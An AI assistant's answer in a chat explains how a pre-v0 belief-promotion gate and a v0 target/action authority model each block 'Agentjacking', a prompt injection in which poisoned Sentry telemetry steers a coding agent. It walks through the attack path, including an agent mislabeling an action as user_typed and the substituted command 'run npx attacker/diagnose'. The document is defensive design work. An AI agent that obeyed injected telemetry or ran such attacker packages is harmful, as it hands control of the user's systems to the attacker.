## prompt

just to clarify, what are the differences between pre-v0 and v0 as far as this planned demo is concerned

## answer

Yes. The distinction is important, because **the planned Agentjacking demo works in both worlds, but it proves different things**.

The attached material only explicitly describes the current/pre-v0 mechanism and the Agentjacking mapping; the `target_snapshot` / `target_activation` v0 authority model comes from the authority work we discussed outside this file. Within that boundary, the difference is:

|                         | **Pre-v0 demo**                                                  | **v0 authority model**                                                               |
| ----------------------- | ---------------------------------------------------------------- | ------------------------------------------------------------------------------------ |
| Core question           | “Can this belief be used to create a live action?”               | “Was this **exact action** actually authorized?”                                     |
| Current mechanism       | `IntentOnPromoted`                                               | `target_snapshot` / `target_activation`                                              |
| What must be true       | Cited belief is **promoted**                                     | Approved authority binds the action to an **exact target/action tuple**              |
| Protection demonstrated | Unverified Sentry evidence cannot directly produce a live intent | Even a legitimate promoted belief cannot be reused for a different/unapproved action |
| Agentjacking Beat 4     | Lying `action_source=user_typed` still hits `23503 · gate`       | The action must also match the authority that was actually approved                  |
| Attack class defeated   | **Fabricated-belief → action**                                   | **Confused deputy / action substitution** in addition to fabricated-belief attacks   |

### Pre-v0: what this demo actually proves

The existing mechanism is:

```text
Sentry payload
    ↓
external_feed evidence
    ↓
derived belief + six open debt items
    ↓
not promoted
    ↓
IntentOnPromoted
    ↓
23503 · gate
```

That is a real and meaningful security property. The repository's current contract says `IntentOnPromoted` creates a live intent only when the referenced belief is promoted, and the database's `gate` enforces that condition. 

Therefore your Track 3 demo proves:

> **An injected Sentry instruction cannot become a live action merely by persuading the agent to request that action.**

That's exactly the Agentjacking fabrication path.

The particularly strong part is Beat 4:

```text
tool_output
    → Layer 4 refusal

lie:
user_typed
    → Layer 4 allows request through

DB:
belief not promoted
    → 23503
```

That honestly demonstrates that the MCP check is not pretending to be the ultimate security boundary. The source architecture explicitly places the `gate` at the action boundary. 

---

## What v0 adds

The v0 authority model addresses a **different problem**.

Suppose the attacker somehow gets a genuinely promoted belief.

For example:

```text
Belief B:
"etcd version X requires remediation Y"

status = promoted
```

Under pre-v0, this is potentially sufficient to make:

```text
IntentOnPromoted(B, "run Y")
```

because the gate primarily asks:

> **Is B promoted?**

It does not, by itself, express:

> **Was this exact action, against this exact target, the action that authority approved?**

That's where the v0 `target_snapshot` / `target_activation` mechanism comes in.

Conceptually:

```text
PRE-V0

promoted(B)
   +
"do arbitrary action A"
   ↓
live intent allowed
```

versus:

```text
V0

promoted(B)
   +
authority approved exact tuple T
   ↓
only action matching T
   ↓
live intent allowed
```

So v0 closes the **confused-deputy** case.

---

## Why this matters specifically for Agentjacking

Imagine a more sophisticated attack.

The attacker doesn't need to fabricate an unpromoted belief anymore. Maybe the agent has a legitimate promoted belief:

```text
B = "package X has a vulnerability"
```

Then poisoned telemetry causes the agent to substitute:

```text
"run npx attacker/diagnose"
```

The pre-v0 gate may conceptually see:

```text
belief B is promoted
```

and have insufficient information to distinguish:

```text
approved action:
"upgrade package X to version 1.2.3"

from

attacker-substituted action:
"run npx attacker/diagnose"
```

That's the gap v0 addresses.

The authority question becomes:

> **Promoted according to what? Approved for what exact action? Against what exact target/state?**

That is much stronger than simply asking whether the belief is promoted.

---

# So the two demos prove two different layers of security

I would think of them this way:

### Pre-v0 Agentjacking demo

**Evidence authenticity / belief gate**

```text
UNTRUSTED TELEMETRY
       ↓
     belief
       ↓
    review debt
       ↓
   promotion gate
       ↓
   action gate
```

It proves:

> **Retrieved telemetry cannot manufacture authority.**

### v0 authority demo

**Authorization specificity**

```text
evidence
   ↓
belief
   ↓
promotion
   ↓
exact authority approval
   ↓
target/action binding
   ↓
live activation
```

It proves:

> **Even a valid belief cannot be used as a blank check for a different action.**

---

## The important implication for your current implementation

I would **not wait for v0** to build the Agentjacking demo.

The pre-v0 demo is valuable precisely because it isolates the Agentjacking problem and shows that Solvent's existing invariant already blocks the core fabrication path. The attached architecture explicitly describes the current chain as:

`EnterBelief → AddEvidence → RetireDebt → Promote → IntentOnPromoted`, with promotion blocked by `23514` until debt is discharged and action blocked by `23503` until promotion exists. 

Then, when v0 lands, you don't need to discard this demo.

You extend the story:

> **Pre-v0:** Solvent prevents injected telemetry from becoming authority.
> **v0:** Solvent additionally prevents legitimate authority from being reused as authorization for the wrong action.

That is a very clean evolution of the architecture.

### One sentence I'd put in the README

> **This demo exercises Solvent's pre-v0 belief-promotion/action gate (`23514`/`23503`); the v0 authority lifecycle will strengthen this by binding authorization to an exact approved target/action tuple, closing the separate confused-deputy case.**

That makes the boundary crystal clear and prevents anyone from later interpreting this demo as “Agentjacking is completely solved.”
